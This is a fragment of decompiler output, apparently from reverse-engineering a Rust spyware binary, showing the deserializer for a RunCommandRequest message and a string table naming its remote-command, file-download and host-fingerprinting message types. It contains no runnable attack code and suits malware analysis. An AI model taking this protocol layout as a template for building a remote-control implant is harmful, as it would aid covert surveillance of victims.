long long spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::RunCommandRequest>::deserialize(unsigned long long a0, unsigned long long a1)
{
    a0.deserialize_struct(a1, "RunCommandRequestcommandasync_runRunCommandResponseoutputerror_infoDownloadFileRequestDownloadFileResponsefile_dataGetBasicInfoRequestplaceholderOperatingSystemWindowsLinuxFreeBSDMacOSIOSAndroidUnknownArchitecturex86x86_64powerpcpowerpc64armaarch64PointerW", 17);
    return a0;
}
